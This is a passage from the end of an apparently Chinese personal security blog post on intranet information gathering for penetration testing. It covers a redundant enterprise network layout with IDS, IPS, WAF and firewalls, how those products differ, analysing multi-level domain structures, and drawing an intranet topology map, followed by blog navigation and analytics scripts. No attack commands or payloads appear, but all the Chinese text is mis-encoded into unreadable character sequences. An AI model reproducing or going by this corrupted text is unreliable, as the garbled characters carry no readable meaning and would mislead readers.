<li><p>æ ¸å¿ƒå±‚æœ‰ä¸¤ä¸ªæ ¸å¿ƒäº¤æ¢æœºï¼Œå®ç°è´Ÿè½½å‡è¡¡å’Œçƒ­å¤‡ä»½ï¼Œå³ä½¿æœ‰ä¸€ä¸ªæ ¸å¿ƒäº¤æ¢æœºå®•æœºäº†ï¼Œç½‘ç»œä¹Ÿä¸ä¼šç˜«ç—ªã€‚</p>
</li>
<li><p>å¯¹å†…æœåŠ¡å™¨æœ‰ä¸€ä¸ªIDSå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œæ£€æµ‹å¯¹å†…æœåŠ¡å™¨çš„å®‰å…¨ã€‚</p>
</li>
<li><p>å¯¹å¤–æœåŠ¡å™¨æœ‰ä¸€ä¸ª WAFå’ŒIDS ï¼Œç”¨æ¥æ£€æµ‹å¤–ç½‘ç”¨æˆ·å¯¹å¯¹å¤–æœåŠ¡å™¨çš„è®¿é—®ã€‚</p>
</li>
<li><p>è¾¹ç•Œé˜²ç«å¢™ä¸»è¦æ˜¯ç”¨æ¥è¿›è¡Œæµé‡æ§åˆ¶ã€æµé‡è¿‡æ»¤å’Œè¿›è¡Œå†…å¤–ç½‘NATè½¬æ¢ã€‚</p>
</li>
<li><p>åœ¨ç½‘ç»œå‡ºå£å¤„ï¼Œè¿˜æœ‰IPSå…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œå®æ—¶æ£€æµ‹æ˜¯å¦æœ‰å¼‚å¸¸æ”»å‡»è¡Œä¸ºï¼Œå¹¶åŠæ—¶é˜»æ–­ã€‚</p>
</li>
<li><p>å‡ºå£è·¯ç”±å™¨ç”±ä¸¤ä¸ªä¸åŒçš„è¿è¥å•†æä¾›ï¼Œæä¾›å¯¹å…¬ç½‘è·¯ç”±ã€‚</p>
</li>
<li><p>é˜²ç«å¢™ã€IPS å’Œ è¾¹ç•Œè·¯ç”±å™¨éƒ½æœ‰ä¸¤ä¸ªï¼Œå®ç°è´Ÿè½½å‡è¡¡å’Œçƒ­å¤‡ä»½ã€‚å³ä½¿ä»»ä½•ä¸€ä¸ªå®•æœºäº†ï¼Œéƒ½ä¸ä¼šå½±å“ä¼ä¸šç½‘ç»œçš„æ­£å¸¸è¿ä½œã€‚</p>
</li>
</ul>
<p><strong>4ã€å®‰å…¨äº§å“</strong></p>
<p>â€‹        IDSï¼ˆIntrusion Detection Systemsï¼‰ï¼Œåªæ˜¯åšäº›æ”»å‡»çš„æ£€æµ‹å·¥ä½œï¼Œæœ¬èº«å¹¶ä¸åšé˜²æŠ¤ï¼Œå®ƒæ£€æµ‹åˆ°æ”»å‡»çš„æ—¶å€™ï¼Œå¯èƒ½æ­¤æ—¶æ”»å‡»å·²ç»äº§ç”Ÿç¾éš¾äº†ï¼Œæ‰€ä»¥IDSä¸€èˆ¬éƒ½éœ€è¦å’Œä¸€äº›é˜²æ”»å‡»è®¾å¤‡IPSå…±ç”¨ï¼›</p>
<p>â€‹        IPSï¼ˆIntrusion Prevention System)ï¼Œå®ƒä¸å…‰å¯¹å·²çŸ¥çš„æ”»å‡»ç§ç±»èƒ½é˜²å¾¡ï¼Œè¿˜èƒ½æ£€æµ‹äº›å¼‚å¸¸åè®®çš„æ”»å‡»ï¼Œæ¯”è¾ƒçµæ´»ã€‚</p>
<ul>
<li>é˜²ç«å¢™æ˜¯é˜²å¾¡ç³»ç»Ÿï¼Œå±äºè®¿é—®æ§åˆ¶ç±»äº§å“</li>
<li>IDSæ˜¯å…¥ä¾µæ£€æµ‹ç³»ç»Ÿï¼Œå±äºå®¡è®¡ç±»äº§å“</li>
<li>IPSæ˜¯å…¥ä¾µé˜²å¾¡ç³»ç»Ÿï¼Œå±äºè®¿é—®æ§åˆ¶ç±»äº§å“</li>
<li>é˜²ç«å¢™æ˜¯åŸºäºIPåœ°å€å’Œç«¯å£æ¥æ‰§è¡Œè®¿é—®æ§åˆ¶çš„</li>
<li>IPSæ˜¯åŸºäºå…¥ä¾µæ£€æµ‹æ¥æ‰§è¡Œè®¿é—®æ§åˆ¶çš„</li>
</ul>
<h3 id="2-16-3-å¤šå±‚åŸŸç»“æ„"><a href="#2-16-3-å¤šå±‚åŸŸç»“æ„" class="headerlink" title="2.16.3 å¤šå±‚åŸŸç»“æ„"></a>2.16.3 å¤šå±‚åŸŸç»“æ„</h3><p>â€‹        åœ¨ä¸Šè¿°å†…å®¹çš„åŸºç¡€ä¸Šï¼Œå¯ä»¥å°è¯•åˆ†æåŸŸç»“æ„ã€‚å› ä¸ºå¤§å‹ä¼ä¸šæˆ–è€…å•ä½çš„å†…éƒ¨ç½‘ç»œå¤§éƒ½é‡‡ç”¨å¤šå±‚åŸŸç»“æ„ç”šè‡³å¤šçº§åŸŸç»“æ„ï¼Œæ‰€ä»¥ï¼Œåœ¨è¿›è¡Œå†…ç½‘æ¸—é€æµ‹è¯•æ—¶ï¼Œé¦–å…ˆè¦åˆ¤æ–­å½“å‰å†…ç½‘ä¸­æ˜¯å¦å­˜åœ¨å¤šå±‚åŸŸã€å½“å‰è®¡ç®—æœºæ‰€åœ¨çš„åŸŸæ˜¯å‡ çº§å­åŸŸã€è¯¥å­åŸŸçš„åŸŸæ§åˆ¶å™¨åŠæ ¹åŸŸçš„åŸŸæ§åˆ¶å™¨æ˜¯å“ªäº›ã€å…¶ä»–åŸŸçš„åŸŸæ§åˆ¶å™¨æ˜¯å“ªäº›ã€ä¸åŒçš„åŸŸä¹‹é—´æ˜¯å¦å­˜åœ¨åŸŸä¿¡ä»»å…³ç³»ç­‰ã€‚</p>
<h3 id="2-16-4-ç»˜åˆ¶å†…ç½‘æ‹“æ‰‘å›¾"><a href="#2-16-4-ç»˜åˆ¶å†…ç½‘æ‹“æ‰‘å›¾" class="headerlink" title="2.16.4 ç»˜åˆ¶å†…ç½‘æ‹“æ‰‘å›¾"></a>2.16.4 ç»˜åˆ¶å†…ç½‘æ‹“æ‰‘å›¾</h3><p>â€‹        é€šè¿‡ç›®æ ‡ä¸»æœºåŠå…¶æ‰€åœ¨åŸŸçš„å„ç±»ä¿¡æ¯ï¼Œå°±å¯ä»¥ç»˜åˆ¶å†…ç½‘çš„æ‹“æ‰‘å›¾äº†ã€‚åœ¨åç»­çš„æ¸—é€æµ‹è¯•ä¸­ï¼Œå¯¹ç…§æ‹“æ‰‘å›¾ï¼Œå¯ä»¥å¿«é€Ÿäº†è§£åŸŸçš„å†…éƒ¨ç¯å¢ƒã€å‡†ç¡®å®šä½å†…ç½‘ä¸­çš„ç›®æ ‡ã€‚</p>

        </div>

    </div>

    

    

    

    
<div class="article-copyright hairline">
  <p>
    æœ¬ä½œå“é‡‡ç”¨ <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-nd/4.0/">çŸ¥è¯†å…±äº«ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç¦æ­¢æ¼”ç» 4.0 å›½é™…è®¸å¯åè®®</a> è¿›è¡Œè®¸å¯ã€‚
  </p>
</div>


    

    
<nav class="article-nav">
  
    <a href="/f0bfc07b.html" id="article-nav-newer" class="article-nav-link-wrap">
      <div class="article-nav-caption">ä¸‹ä¸€ç¯‡</div>
      <div class="article-nav-title">
        
          Empire-é…ç½®å®‰è£…å’ŒåŸºæœ¬ä½¿ç”¨
        
      </div>
    </a>
  
  
    <a href="/a74c6112.html" id="article-nav-older" class="article-nav-link-wrap">
      <div class="article-nav-caption">ä¸Šä¸€ç¯‡</div>
      <div class="article-nav-title">å¿«é€Ÿè®¾ç½®åšå®¢å‰é¡µ-Front-matter</div>
    </a>
  
</nav>


    <section class="share">
        <div class="share-title">åˆ†äº«</div>
        <a class="share-item" target="_blank"
            href="https://twitter.com/share?text=å†…ç½‘å­¦ä¹ ç¬”è®°äºŒ | å†…ç½‘ä¿¡æ¯æœé›† - RainMaker&url=http://hasaki-h2.github.io/40b5e599.html">
            <box-icon type='logo' name='twitter'></box-icon>
        </a>
        <a class="share-item" target="_blank"
            href="https://www.facebook.com/sharer.php?title=å†…ç½‘å­¦ä¹ ç¬”è®°äºŒ | å†…ç½‘ä¿¡æ¯æœé›† - RainMaker&u=http://hasaki-h2.github.io/40b5e599.html">
            <box-icon name='facebook-square' type='logo' ></box-icon>
        </a>
        <!-- <a class="share-item" target="_blank"
            href="https://service.weibo.com/share/share.php?title=å†…ç½‘å­¦ä¹ ç¬”è®°äºŒ | å†…ç½‘ä¿¡æ¯æœé›† - RainMaker&url=http://hasaki-h2.github.io/40b5e599.html&pic=">
            <div class="n-icon n-icon-weibo"></div>
        </a> -->
    </section>

</article>








<section class="comments">
    <div id="valine-container"></div>
</section>
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>





<script src="./js/busuanzi.pure.mini.js"></script>

</div>
                </section>
            </section>

            
            <aside class="sidebar sidebar-search-fix">
                

    <div class="search">
    <div class="has-icon-right">
        <input type="text" class="form-input" id="search" placeholder="SEARCH" autocomplete="off">
        <div class="form-icon">
            <box-icon name='search' color="#3c4859"></box-icon>
        </div>
    </div>
    <div class="search-result" id="search-ps"></div>
</div>


<div class="widget" id="widget">
    
      
  <div class="widget-wrap">
    <div class="widget-inner">
      <div class="toc post-toc-html"></div>
    </div>
  </div>

    
      
  <div class="widget-wrap widget-cate">
    <div class="widget-title"><span>Categories</span></div>
    <div class="widget-inner">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E6%B8%97%E9%80%8F/">Webæ¸—é€</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">ä»£ç å®¡è®¡</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%B6%E4%BB%96/">å…¶ä»–</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">å†…ç½‘æ¸—é€</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">å·¥å…·ä½¿ç”¨</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/">å¼€å‘è¯­è¨€</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">æ“ä½œç³»ç»Ÿ</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/">æ•°æ®åº“</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">æ¨ªå‘ç§»åŠ¨</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BA%AF%E6%BA%90%E5%8F%8D%E5%88%B6/">æº¯æºååˆ¶</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">æ¼æ´å¤ç°</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">ç¯å¢ƒé…ç½®</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/">è„šæœ¬å¼€å‘</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap widget-tags">
    <div class="widget-title"><span>Tags</span></div>
    <div class="widget-inner">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARL/" rel="tag">ARL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Access/" rel="tag">Access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Bugku/" rel="tag">Bugku</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Burpsuite/" rel="tag">Burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cap-Pwd/" rel="tag">Cap_Pwd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CobaltStrike/" rel="tag">CobaltStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Empire/" rel="tag">Empire</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GetShell/" rel="tag">GetShell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Goby/" rel="tag">Goby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Intranet/" rel="tag">Intranet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/" rel="tag">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Lfi/" rel="tag">Lfi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Log4j/" rel="tag">Log4j</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql/" rel="tag">Mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Oracle/" rel="tag">Oracle</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PTE/" rel="tag">PTE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Priviledge/" rel="tag">Priviledge</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Proxy/" rel="tag">Proxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pth/" rel="tag">Pth</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sql/" rel="tag">Sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VulLab/" rel="tag">VulLab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xff/" rel="tag">Xff</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xray/" rel="tag">Xray</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap widget-recent-posts">
    <div class="widget-title"><span>Recent Posts</span></div>
    <div class="widget-inner">
      <ul>
        
          <li>
            <a href="/896645eb.html">å†…ç½‘å­¦ä¹ ç¬”è®°ä¸ƒ | è·¨åŸŸæ”»å‡»åˆ†æåŠé˜²å¾¡</a>
          </li>
        
          <li>
            <a href="/83b61d10.html">å†…ç½‘å­¦ä¹ ç¬”è®°å…­ | åŸŸæ§åˆ¶å™¨å®‰å…¨</a>
          </li>
        
          <li>
            <a href="/f9f7ea1f.html">å†…ç½‘å­¦ä¹ ç¬”è®°å…« | æƒé™ç»´æŒåˆ†æåŠé˜²å¾¡</a>
          </li>
        
          <li>
            <a href="/687f7c3.html">å†…ç½‘å­¦ä¹ ç¬”è®°äº” | åŸŸå†…æ¨ªå‘ç§»åŠ¨åˆ†æåŠé˜²å¾¡</a>
          </li>
        
          <li>
            <a href="/1ed1a532.html">å‘æ—¥è‘µRCEå¤ç°</a>
          </li>
        
      </ul>
    </div>
  </div>

    
      
  <div class="widget-wrap widget-archive">
    <div class="widget-title"><span>Archive</span></div>
    <div class="widget-inner">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a></li></ul>
    </div>
  </div>


    
</div>

<div id="backtop"><i class="icon icon-arrow-up"></i></div>
            </aside>
            
        </div>
    </div>

    <footer class="footer">
    <div class="footer-wave">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="#3c4859" fill-opacity="1" d="M0,160L60,181.3C120,203,240,245,360,240C480,235,600,181,720,186.7C840,192,960,256,1080,261.3C1200,267,1320,213,1380,186.7L1440,160L1440,320L1380,320C1320,320,1200,320,1080,320C960,320,840,320,720,320C600,320,480,320,360,320C240,320,120,320,60,320L0,320Z"></path></svg>
    </div>

    <div class="footer-wrap">
        <div class="footer-inner"> 
            RainMaker &copy; 2022<br>
            Powered By Hexo Â· Theme By <a href="https://github.com/lh1me/hexo-theme-aomori" target="_blank">Aomori</a>
        </div>
    </div>

</footer>






<script src="/dist/build.js?1637200696663.js"></script>


<script src="/dist/custom.js?1637200696663.js"></script>



<!-- ç™¾åº¦é“¾æ¥æäº¤ -->
<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        }
        else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>





<!-- Baidu Analytics-->
<script type="text/javascript">
    var _hmt = _hmt || [];
    (function () {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?df9a1971c34200c9a339305db5b13a60";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>



</body>

</html>